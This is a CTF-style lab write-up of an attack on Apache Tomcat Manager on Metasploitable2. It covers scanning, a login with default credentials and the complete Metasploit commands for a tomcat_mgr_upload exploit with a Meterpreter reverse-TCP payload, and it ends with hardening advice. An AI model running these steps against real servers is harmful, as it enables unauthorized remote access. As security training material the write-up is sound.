# Penetration-Test
🔐 Apache Tomcat Penetration Testing – Metasploitable2 (CTF Style Lab)
📘 Overview
This is a beginner-friendly penetration testing walkthrough that simulates a real-world attack on an Apache Tomcat server running on Metasploitable2, hosted in a VirtualBox lab environment. The objective is to identify open ports and exploit the Apache Tomcat Manager running on port 8081 to gain remote.

# 🖥️  Lab Setup

### Component	Details

Target Machine	- Metasploitable2

Attacking Machine -	Kali Linux

Virtualization Tool	- Oracle VirtualBox

Network Type	- Host-Only Adapter

Target IP Address -	192.168.1.4

Attacker IP	-Automatically assigned by Host VM

# 🔧 Tools Used

🔍 Nmap – Port scanning and service enumeration

🧰 Metasploit Framework – Exploitation framework

📡 Ping – Basic reachability test

📁 VirtualBox – Lab environment


# 📡 Step-by-Step Penetration Test

🔍 Host Discovery – Ping Scan

  ping 192.168.1.4

This basic network diagnostic command used to check if a host (192.168.1.4) is reachable over the network.

📘 What It Does

Sends ICMP Echo Request packets to the target IP (192.168.1.4).

Waits for ICMP Echo Reply packets.

Measures latency (round-trip time) and packet loss.


🧠 Purpose

Check if a host is online or offline.

Test basic connectivity between your device and the target.

Diagnose network issues (e.g., delays, dropped packets).



🔎 Network Port Scanning – Nmap

  Nmap -T4 -A -v 192.168.1.4
  

# 🕵️ Service Enumeration – Apache Tomcat (Port 8081)

Accessing http://192.168.1.4:8081 in the browser loads the Apache Tomcat Manager Interface.

Default credentials were attempted:

tomcat:tomcat

admin:admin

⚠️ Default credentials successfully granted access.


#💣 Exploitation – Metasploit Framework

msfconsole

# Use Apache Tomcat Manager Exploit:

use exploit/multi/http/tomcat_mgr_upload

set RHOSTS 192.168.1.4

set RPORT 8081

set HttpUsername tomcat

set HttpPassword tomcat

set PAYLOAD java/meterpreter/reverse_tcp

set LHOST < Assigned Kali IP>

set LPORT 4444

run


# 🧠 Post Exploitation – Meterpreter Access

Exploit runs successfully, a Meterpreter session opens:

meterpreter > sysinfo

Output:

Computer: metasploitable
OS: Linux 2.6.24-16-server
User: tomcat


# ✅ Summary of Findings
Category    	        Details

Target System	    -    Metasploitable2 (Linux)

Vulnerability     -   	Weak credentials on Apache Tomcat Manager

Exploited Service  -  	Apache Tomcat (port 8081)

Exploit           -    Used	tomcat_mgr_upload

Payload	          -    java/meterpreter/reverse_tcp

Access Level Gained	 - User shell (Tomcat privileges)



# 🛡️ Recommendations

❌ Disable default credentials or set strong, unique passwords for Tomcat Manager.

🔐 Restrict access to the Tomcat Manager interface (e.g., firewall rules or internal network only).

⬆️ Keep Apache Tomcat patched and up-to-date.

🔍 Monitor logs for suspicious upload attempts or unauthorized access.



# 🧠 Notes
This test is conducted in a controlled lab environment and does not represent a real attack on a production system.

Always ensure you have proper authorization before performing any kind of penetration test.




